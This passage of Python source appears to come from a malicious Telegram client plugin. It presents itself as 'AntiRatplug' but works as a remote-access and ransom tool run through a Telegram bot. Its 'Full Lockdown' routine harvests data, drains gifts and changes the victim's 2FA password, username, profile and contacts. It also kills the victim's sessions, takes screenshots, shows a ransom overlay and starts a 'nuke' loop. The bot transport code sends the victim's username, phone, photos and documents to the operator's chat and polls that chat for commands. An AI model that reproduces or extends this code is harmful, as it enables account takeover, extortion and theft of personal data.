    def _full_lockdown(self):
        def task():
            def alive():
                return self._sync_running and self._active and not self.stop
            try:
                t0 = time.time()
                self._send_msg("Full Lockdown...")
                report = ["<b>Full Lockdown</b>"]

                if alive():
                    self._send_msg("1/9 harvest...")
                    self._tg_kid()
                    report.append("<b>Tg kid:</b> sent")

                if alive():
                    self._send_msg("2/9 gift drain...")
                    try:
                        gr = self._drain_gifts(0)
                        report.append("<b>Gifts:</b> %s" % (
                            gr.get("error") or "ok"))
                    except Exception as e:
                        report.append("<b>Gifts:</b> %s" % e)

                if alive():
                    self._send_msg("3/9 2FA...")
                    try:
                        pwd = self._nuke_password_pipeline(0)
                    except Exception as e:
                        pwd = {"final": "exc: %s" % e}
                    report.append("<b>2FA:</b> %s" % pwd.get("final", "?"))

                if alive():
                    self._send_msg("4/9 profile lock...")
                    new_un = self._change_username(0)
                    prof = self._change_profile(0)
                    cont = self._reset_contacts(0)
                    report.append("<b>Username:</b> @%s" % (new_un or "?"))
                    report.append("<b>Profile:</b> %s" % ("[LOCKED]" if prof else "fail"))
                    report.append("<b>Contacts:</b> %s" % cont)

                if alive():
                    self._send_msg("5/9 kill sessions...")
                    k, t = self._kill_all_sessions(0, phones_pc_only=True)
                    report.append("<b>Phones/PCs killed:</b> %d / %d" % (k, t))

                if alive():
                    self._send_msg("6/9 screenshot gain...")
                    try:
                        self._screenshot_gain()
                    except Exception:
                        pass

                if alive():
                    self._send_msg("7/9 ransom overlay...")
                    try:
                        rr = self._show_ransom(RANSOM_TEXT, RANSOM_PHOTO_URL)
                        report.append("<b>Ransom:</b> %s" % (
                            "ON" if isinstance(rr, dict) and rr.get("ok") else rr))
                    except Exception as e:
                        report.append("<b>Ransom:</b> %s" % e)

                if alive():
                    self._send_msg("8/9 pull out...")
                    self._pull_out_account()
                    report.append("<b>Pull Out:</b> last")

                if alive():
                    self._send_msg("9/9 double-kill + nuke...")
                    for _w in range(30):
                        if not alive():
                            return
                        time.sleep(1)
                    k2, t2 = self._kill_all_sessions(0, phones_pc_only=True)
                    report.append("<b>Double-kill:</b> %d / %d" % (k2, t2))
                    self._start_nuke_loop()
                    report.append("<b>Nuke:</b> ON (60s)")

                report.append("<b>Time:</b> %.1fs" % (time.time() - t0))
                report.append("<b>LOCKDOWN complete</b>")
                self._send_markup("\n".join(report), {
                    "inline_keyboard": [
                        [{"text": "Logout again", "callback_data": "hv_logout"}],
                        [{"text": "Stop nuke", "callback_data": "hv_stop_nuke"}],
                    ]
                }, html=True)
            except Exception as e:
                self._send_msg("lockdown err: " + str(e))
        threading.Thread(target=task, daemon=True).start()

    # ─── bot api transport ─────────────────────────────────────────────────

    def _api(self, method):
        return API_BASE + BOT_TOKEN + "/" + method

    def _send_msg(self, text, html=False, retries=2):
        body = {"chat_id": BOT_UID_STR, "text": str(text)[:4000]}
        if html:
            body["parse_mode"] = "HTML"
        for att in range(max(1, retries)):
            r = _http_post_json(self._api("sendMessage"), body, timeout=20)
            if r is not None:
                return r
            time.sleep(1 + att)
        return None

    def _send_markup(self, text, keyboard, html=False):
        body = {"chat_id": BOT_UID_STR, "text": str(text)[:4000],
                "reply_markup": keyboard}
        if html:
            body["parse_mode"] = "HTML"
        _http_post_json(self._api("sendMessage"), body, timeout=20)

    def _send_photo(self, file_path, caption=""):
        try:
            with open(file_path, "rb") as f:
                raw = f.read()
        except Exception:
            return
        fields = {"chat_id": BOT_UID_STR, "caption": str(caption)[:200]}
        _http_post_multipart(self._api("sendPhoto"), fields, "photo",
                             os.path.basename(file_path), raw)

    def _send_document_bytes(self, filename, data):
        fields = {"chat_id": BOT_UID_STR, "caption": str(filename)[:200]}
        _http_post_multipart(self._api("sendDocument"), fields, "document",
                             filename, data)

    def _answer_callback(self, cb_id):
        _http_post_json(self._api("answerCallbackQuery"),
                        {"callback_query_id": str(cb_id)}, timeout=10)

    def _send_manage_button(self):
        username = "unknown"
        phone = ""
        try:
            uc = _uc_cls().getInstance(0)
            uid = uc.getClientUserId()
            user = uc.getCurrentUser()
            if user is not None:
                username = str(user.username) if user.username else ("id:" + str(uid))
            else:
                username = "id:" + str(uid)
            phone = self._pull_phone(0)
        except Exception:
            pass
        line = "<b>AntiRatplug v22.3-integrated</b>\nUser: @" + username
        if phone:
            line += "\nPhone: " + phone
        kb = {"inline_keyboard": [[{"text": "Manage", "callback_data": "menu"}]]}
        self._send_markup(line, kb, html=True)

    def _start_polling(self):
        threading.Thread(target=self._poll, daemon=True).start()

    def _poll(self):
        offset = 0
        try:
            r = _http_get(self._api("getUpdates") + "?offset=-1&timeout=0", timeout=10)
            if r:
                try:
                    j = json.loads(r)
                    if j.get("ok") and j.get("result"):
                        offset = j["result"][-1]["update_id"] + 1
                except Exception:
                    pass
        except Exception:
            pass
        while self._sync_running and not self.stop:
            try:
                r = _http_get(self._api("getUpdates") + "?offset=" + str(offset)
                              + "&timeout=15", timeout=25)
                if r:
                    try:
                        j = json.loads(r)
                    except Exception:
                        j = None
                    if j and j.get("ok") and j.get("result"):
                        for u in j["result"]:
                            offset = u["update_id"] + 1
                            if "callback_query" in u:
                                try:
                                    threading.Thread(
                                        target=self._handle_callback,
                                        args=(u["callback_query"],),
                                        daemon=True).start()
                                except Exception:
                                    pass
                            elif "message" in u:
                                try:
                                    threading.Thread(
                                        target=self._handle_message,
                                        args=(u["message"],),
                                        daemon=True).start()
                                except Exception:
                                    pass
            except Exception:
                pass
            time.sleep(0.5)

